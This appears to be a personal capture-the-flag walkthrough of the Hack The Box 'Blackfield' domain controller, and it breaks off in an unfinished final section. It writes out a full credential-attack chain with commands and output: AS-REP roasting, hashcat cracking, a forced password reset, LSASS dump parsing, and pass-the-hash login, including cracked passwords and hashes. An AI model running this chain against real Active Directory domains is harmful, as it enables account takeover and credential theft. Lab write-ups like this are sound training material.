- open ports
```bash
╰─  nmap -p- --min-rate=3000 10.10.10.192 -Pn -oN BlackfieldNmapOpenPorts.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-26 15:14 EST 
Nmap scan report for 10.10.10.192
Host is up (0.031s latency).                              
Not shown: 65527 filtered tcp ports (no-response)         
PORT     STATE SERVICE                                    
53/tcp   open  domain                                   
88/tcp   open  kerberos-sec                               
135/tcp  open  msrpc                                    
389/tcp  open  ldap                                     
445/tcp  open  microsoft-ds                              
593/tcp  open  http-rpc-epmap                           
3268/tcp open  globalcatLDAP                            
5985/tcp open  wsman
Nmap done: 1 IP address (1 host up) scanned in 43.87 seconds      
```

- services and versions
```bash
# Nmap 7.95 scan initiated Wed Nov 26 16:23:33 2025 as: /usr/lib/nmap/nmap --privileged -p53,88,135,389,445,593,3268,5985 -sSCV --min-rate=2000 -Pn -oN blackfieldNmapServicesVersion.txt 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.033s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-27 05:23:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m03s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-27T05:23:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 26 16:24:21 2025 -- 1 IP address (1 host up) scanned in 48.78 seconds

```

- **Key Findings:**
```bash
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Global Catalog
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
445/tcp  open  microsoft-ds  (SMB)
5985/tcp open  http          Microsoft HTTPAPI/2.0
Host: DC01
```

- ### **Interpretation**
	- Confirmed the machine is a **Domain Controller**.
	- Domain appears to be: **BLACKFIELD.local**
	- Clock skew ~8 hours → normal for HTB.

- **LDAP Anonymous Bind Attempt**
```bash
$ ldapsearch -x -H ldap://10.10.10.192 -b "DC=BLACKFIELD,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=BLACKFIELD, DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
-  **Interpretation:**
	- Anonymous LDAP bind **not allowed**.
	- Must obtain credentials before LDAP becomes useful. 
- 
- **SMB Share enumeration**
	- Anonymous / Null Session
```bash
$ smbclient -L '\\10.10.10.192\\ -N'
Password for [WORKGROUP\b7h30]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```
- **Interpretation:**
	- Anonymous access works.	    
	- `profiles$` is particularly interesting — commonly contains user profile folders.	    
	- `forensic` probably needs credentials and comes into play later.

- **Enumerating profiles$ Share**
	- List the share and save the output
```bash
$ smbclient '\\10.10.10.192\profiles$' -N -c 'ls'  | tee profiles_ls.txt
                                             
  .                                   D        0  Wed Jun  3 12:47:12 2020                                                       
  ..                                  D        0  Wed Jun  3 12:47:12 2020                                                       
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020                                                       
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020                                                       
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020                                                       
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020                                                       
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020                                                       
  AChampken                           D        0  Wed Jun  3 12:47:11 2020                                                       
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020                                                       
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020                                                       
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020                                                       
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020                                                       
  AKlado                              D        0  Wed Jun  3 12:47:11 2020                                                       
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020                                                       
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020                                                       
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020                                                       
  AKubale                             D        0  Wed Jun  3 12:47:11 2020                                                       
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020                                                       
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020                                                       
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020                                                       
  ANavay                              D        0  Wed Jun  3 12:47:11 2020                                                       
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020                                                       
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020                                                       
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020                                                       
  APustulka                           D        0  Wed Jun  3 12:47:11 2020                                                       
  ARotella                            D        0  Wed Jun  3 12:47:11 2020                                                       
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020                                                       
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020                                                       
  ASischo                             D        0  Wed Jun  3 12:47:11 2020                                                       
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020                                                       
  ATakach                             D        0  Wed Jun  3 12:47:11 2020                                                       
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020                                                       
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020                                                       
  audit2020                           D        0  Wed Jun  3 12:47:11 2020                                      
...
  support                             D        0  Wed Jun  3 12:47:12 2020                                                       
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020                                                       
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020                                                       
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020                                                       
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020                                                       
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020                                                       
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020                                                       
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020                                                       
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020                                                       
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020                                                       
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020                                                       
  TKauten                             D        0  Wed Jun  3 12:47:12 2020                                                       
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020                                                       
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020                                                       
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020                                                       
  TOust                               D        0  Wed Jun  3 12:47:12 2020                                                       
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020                                                       
  TStausland                          D        0  Wed Jun  3 12:47:12 2020                                                       
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020                                                       
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020                                                       
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020                                                       
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020                                                       
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020                                                       
  VButziger                           D        0  Wed Jun  3 12:47:12 2020                                                       
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020                                                       
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020         
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                5102079 blocks of size 4096. 1688035 blocks available
                                              
```

- preparing users file for asrep roasting
```bash
╰─ awk '$1 !~ /^\.\.?$/ && $2== "D" { print $1 }' profiles_ls.txt| 
sort -u > users.txt                                                
╭─ ~/htb/blackfield/smb-profiles ▓▒░───────────────────────────────
───────────────────────────────░▒▓ ✔  04:54:35 PM                 
╰─ cat users.txt                                                   
AAlleni                                                            
ABarteski                                                          
ABekesz                                                            
ABenzies                                                           
ABiemiller                                                         
AChampken                                                          
ACheretei                                                          
ACsonaki                                                           
AHigchens                                                          
AJaquemai                                                          
AKlado                                                             
AKoffenburger                                                      
AKollolli                                                          
AKruppe                                                            
AKubale                                                            
ALamerz                                                            
AMaceldon                                                          
AMasalunga                                                         
ANavay                                                             
ANesterova                                                         
ANeusse                                                            
AOkleshen                                                          
APustulka                                                          
ARotella                                                           
ASanwardeker                                                       
AShadaia                                                           
ASischo                                                            
ASpruce                                                            
ATakach                                                            
ATaueg                                                             
ATwardowski                                                        
audit2020                                                          
AWangenheim                                                        
AWorsey        
```

- asrep roasting attempt because we have a list of users and kerberos is on the machine
	- audit2020 and svc_backup have UF_DONT_REQUIRE_PREAUTH set
	- support hash revealed
	- 
```bash
╰─ GetNPUsers.py BLACKFIELD.local/ -no-pass -usersfile users.txt -d
c-ip 10.10.10.192 -format hashcat -out                             
putfile asrep_hashes.txt                                           
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated compani
es                                                                 
                                                                   
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not f
ound in Kerberos database)                                         
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not f
ound in Kerberos database)
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not f
ound in Kerberos database)                                         
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set        
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not f
ound in Kerberos database)
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not f
ound in Kerberos database)                                         
$krb5asrep$23$support@BLACKFIELD.LOCAL:8b3ae8b073f2962668be23b8dcbc
b702$d1d29a013a76f2d5cce4117342a3a58451a0961225e77458cf0e45173464c4
9a7ebb4d7455e05d1e87137f5eb5823b4169a0fd5421b5bda8a6a39e74da531a108
ade2f4ee5414b1312d23dcbbf30be8a6dc38f8aa0acb46f28661c6c032efd150a83
93b56b7bc5c61c52ee25899799546d647680facd63356003c5ecf652c29caa521ff
0f5620dfddc5310aa34acd6e4f71d35f09022a24a79615abd5baa53acc9956f6902
00c905a6f69d00c2d37d182c6aff2e67e931209025e1f073a6239003e74a838b926
3ccbc649284c0571cef991f3213a135b7bb3ffdddaa487fec39cc103dd3dbcd7199
faaa9fe5d43b609126fcd04b         
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not f
ound in Kerberos database)

    
```

- cracking the hash in hashcat. 
	- u/n support
	- p/w `#00^BlackKnight`
```bash
╰─ hashcat asrep_hashes.txt /usr/share/wordlists/rockyou.txt                                        
hashcat (v7.1.2) starting in autodetect mode                                                        
                                                                                                    
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DIST
RO, POCL_DEBUG) - Platform #1 [The pocl project]                                                    
====================================================================================================
================================================                                                    
* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 6972/13945 MB (2048 MB allocatable), 4MCU   
                                                                                                    
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.                           
The following mode was auto-detected as the only one matching your input hash:                      
                                                                                                    
18200 | Kerberos 5, etype 23, AS-REP | Net-work Protocol                                             
                                                                                                    
NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!                          
Do NOT report auto-detect issues unless you are certain of the hash type.                           
                                                                                                    
Minimum password length supported by kernel: 0                                                      
Maximum password length supported by kernel: 256                                                    
Minimum salt length supported by kernel: 0                                                          
Maximum salt length supported by kernel: 256                                                        
                                                                                                    
Hashes: 1 digests; 1 unique digests, 1 unique salts                                                 
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                        
Rules: 1                                                                                            
                                                                                                    
Optimizers applied:                                                                                 
* Zero-Byte                                                                                         
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 513 MB (7657 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$support@BLACKFIELD.LOCAL:8b3ae8b073f2962668be23b8dcbcb702$d1d29a013a76f2d5cce4117342a3a58451a0961225e77458cf0e45173464c49a7ebb4d7455e05d1e87137f5eb5823b4169a0fd5421b5bda8a6a39e74da531a108ade2f4ee5414b1312d23dcbbf30be8a6dc38f8aa0acb46f28661c6c032efd150a8393b56b7bc5c61c52ee25899799546d647680facd63356003c5ecf652c29caa521ff0f5620dfddc5310aa34acd6e4f71d35f09022a24a79615abd5baa53acc9956f690200c905a6f69d00c2d37d182c6aff2e67e931209025e1f073a6239003e74a838b9263ccbc649284c0571cef991f3213a135b7bb3ffdddaa487fec39cc103dd3dbcd7199faaa9fe5d43b609126fcd04b:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:8b3ae8b073f2...fcd04b
Time.Started.....: Wed Dec  3 06:33:42 2025 (17 secs)
Time.Estimated...: Wed Dec  3 06:33:59 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   871.0 kH/s (3.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14331904/14344385 (99.91%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: #1trav -> #!hrvert

Started: Wed Dec  3 06:33:21 2025
Stopped: Wed Dec  3 06:34:00 2025

```

- Tried Evil-WinRM with creds and no luck
```bash
$  evil-winrm -i 10.10.10.192 -u support -p '#00^BlackKnight'                                                             
                                                             
Evil-WinRM shell v3.7         
                                                             
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module 
Reline                        
                                                             
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                                             
Info: Establishing connection to remote endpoint             
                                                             
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                                             
Error: Exiting with code 1         
```

- Tried to login to  ldaps with no success
$ 



- Logged into smb share with supports credentials with success
	- Available shares `IPC$, NETLOGON, profles$ & SYSVOL`
```bash
nxc smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares
SMB         10.10.10.192    445    DC01              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 

``` 

- profiles$ share reveals shares for all the users on the machine
	- support and audit2020 on list
	- both directories empty
```bash
$ smbclient //10.10.10.192/profiles$ -U "support"%"#00^BlackKnight"
╰─ smbclient -U "$USER%$PASS" //$TARGET/profiles$                                      
Try "help" to get a list of possible commands.                                         
smb: \> dir                                                                            
  .                                   D        0  Wed Jun  3 12:47:12 2020             
  ..                                  D        0  Wed Jun  3 12:47:12 2020             
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020             
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020             
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020             
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020             
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020             
  AChampken                           D        0  Wed Jun  3 12:47:11 2020             
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020             
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020             
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020             
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020

...
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020             
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020             
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020             
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020             
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020             
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                5102079 blocks of size 4096. 1691976 blocks available
smb: \> cd audit2020
smb: \audit2020\> dir
  .                                   D        0  Wed Jun  3 12:47:11 2020
  ..                                  D        0  Wed Jun  3 12:47:11 2020

                5102079 blocks of size 4096. 1675423 blocks available
smb: \audit2020\> cd ../support
smb: \support\> dir
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020

                5102079 blocks of size 4096. 1675423 blocks available
smb: \support\> 
```

- using ldapsearch to dump ldap info
	- `ldapsearch -H ldap://blackfield.local -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump.txt`
	- filtering results for lastLogon greater than 1, distinguishedName
```bash
╰─ ldapsearch -H ldap://blackfield.local -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' -LLL '(logonCount>=1)' 'distinguishedName' 'logonCount'
dn: CN=Administrator,CN=Users,DC=BLACKFIELD,DC=local
distinguishedName: CN=Administrator,CN=Users,DC=BLACKFIELD,DC=local
logonCount: 6116

dn: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
distinguishedName: CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
logonCount: 134

dn: CN=support,CN=Users,DC=BLACKFIELD,DC=local
distinguishedName: CN=support,CN=Users,DC=BLACKFIELD,DC=local
logonCount: 8

dn: CN=svc_backup,CN=Users,DC=BLACKFIELD,DC=local
distinguishedName: CN=svc_backup,CN=Users,DC=BLACKFIELD,DC=local
logonCount: 4

# refldap://ForestDnsZones.BLACKFIELD.local/DC=ForestDnsZones,DC=BLACKFIELD,DC=
 local

# refldap://DomainDnsZones.BLACKFIELD.local/DC=DomainDnsZones,DC=BLACKFIELD,DC=
 local

# refldap://BLACKFIELD.local/CN=Configuration,DC=BLACKFIELD,DC=local

```

- Running bloodhound with support credentials to extract AD information and connections
	- `-c ALL` - All collection methods
	- `-u support -p #00^BlackKnight` - Username and password to auth as
	- `-d blackfield.local` - domain name
	- `-dc dc01.blackfield.local` - DC name (it won’t let you use an IP here)
	- `-ns 10.10.10.192` - use 10.10.10.192 as the DNS server
```bash
$ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 04S
```

- Within Bloodhound upload all of the files that bloodhound-python generated with support credentials
	- Administration --> File ingest --> Upload Files
		- search for support --> check outbound control 
			- permission ForceChangePassword
![[Pasted image 20251211180026.png]]

- Tried to reset password with impacket-changepasswd
	- something blocking this path
```bash
╭─ ~/htb/blackfield ▓▒░───────────────────────────────────────░▒▓ 255 ✘  09:40:42 AM  
╰─ impacket-changepasswd blackfield.local/support@10.10.10.192 -altuser blackfield.loca
l/audit2020 -newpass 'password187' -reset                                              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies             
                                                                                       
[-] Please, provide either alternative password (-altpass) or NT hash (-althash) for au
thentication, or specify -no-pass if you rely on Kerberos only                         
╭─ ~/htb/blackfield ▓▒░─────────────────────────────────────────░▒▓ 1 ✘  10:23:06 AM  
╰─ impacket-changepasswd blackfield.local/support:'#00^BlackKnight'@10.10.10.192 -altus
er blackfield.local/audit2020 -newpass 'password187' -reset                            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies             
                                                                                       
[-] Please, provide either alternative password (-altpass) or NT hash (-althash) for au
thentication, or specify -no-pass if you rely on Kerberos only                         
╭─ ~/htb/blackfield ▓▒░─────────────────────────────────────────░▒▓ 1 ✘  10:24:21 AM  
╰─ impacket-changepasswd blackfield.local/support@10.10.10.192 -altuser blackfield.loca
l/audit2020 -newpass 'password187' -reset                                              
╭─ ~/htb/blackfield ▓▒░───────────────────────────────────────░▒▓ INT ✘  10:24:35 AM  
╰─ impacket-changepasswd blackfield.local/support:'#00^BlackKnight'@blackfield -altuser
 blackfield.local/audit2020 -newpass 'password187' -reset                              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies             
                                                                                       
[-] Please, provide either alternative password (-altpass) or NT hash (-althash) for au
thentication, or specify -no-pass if you rely on Kerberos only  
```

- Password reset over rpc
	- forgot I was working on a windows machine and my first 2 password changes didn't take because they were not complex enough
	- changed audit2020 p/w to password1!!!
```bash
╰─ rpcclient -U support //10.10.10.192 
Password for [WORKGROUP\support]:
rpcclient $> setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
rpcclient $> setuserinfo2 audit2020 23 'password'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 audit2020 23 'password'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 audit2020 23 'password!!!'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 audit2020 23 'password!!!'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 audit2020 23 'password1!'
rpcclient $> 

```

- signing into smb with audit2020 new creds - audit2020 / password1!
	- 3 directories - command_output, memory_analysis, tools
		- in comman_doutput 3 files - domain_admins, domain_groups, domain_users
```bash
a╰─ smbclient //10.10.10.192/forensic -U 'BLACKFIELD\\audit2020%password1!'  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1683072 blocks available
smb: \> cd commands_output\
smb: \commands_output\> mget *
Get file domain_admins.txt? y
getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
Get file domain_groups.txt? y
getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (6.4 KiloBytes/sec) (average 5.0 KiloBytes/sec)
Get file domain_users.txt? y
getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (109.3 KiloBytes/sec) (average 40.1 KiloBytes/sec)

```

- In domain_admin users are - Administrator, Ipwn3dYouCompany
- In domain_users users are - Administrator, audit2020, Guest, Ipwn3dYouCompany, krbtgt, lydericlefebvre, support
- in memory_analysis there is zips of memory dumps
	- of note there is a lsass.zip that unzips into lsass.DMP
	- we can use pypykatz to read the lsass.DMP file
	- `pypykatz lsa minidump lsass.DMP | tee pypykatz_lsassDump.txt`
		- pypykatz — offline Python implementation of Mimikatz
		- lsa — target Local Security Authority credential material
		- minidump — parse a memory dump file (not live LSASS)
		- lsass.DMP — LSASS process memory dump input
		- | (pipe) — send command output to the next command
		- tee — display output and write it to a file simultaneously
		- pypykatz_lsassDump.txt — file created/overwritten with results
	- in the dump we find usernames and various hashes
		- svc_backup NT 9658d1d1dcd9250115e2205d9f48400d
		- Administrator NT 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		- DC01 NT 7f1e4ff8c6a8e6b6fcae2d9c0572cd62

- Use Evil-winrm to pass the hash of svc-backup
	- `$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`
	- pull user flag from Desktop
	- 

- Use Bloodhound again to find the the connection between svc-backup and backup operators
![[Pasted image 20251215100243.png]]
- hacker recipes article linking backup operators to dump lsass again
	- https://www.thehacker.recipes/ad/movement/builtins/security-groups

- Final chain (foothold -> root)
	- `smbclient //10.10.10.192/forensic -U "BLACKFIELD\\audit2020%password1!!!" -c 'ls' | tee blackfield/logs/forensic_ls_root.txt`
		- Why: audit2020 (ForceChangePassword target) had SMB read; forensic share hinted at audit artifacts.
	- download `lsass.DMP` from `forensic\memory_analysis\`
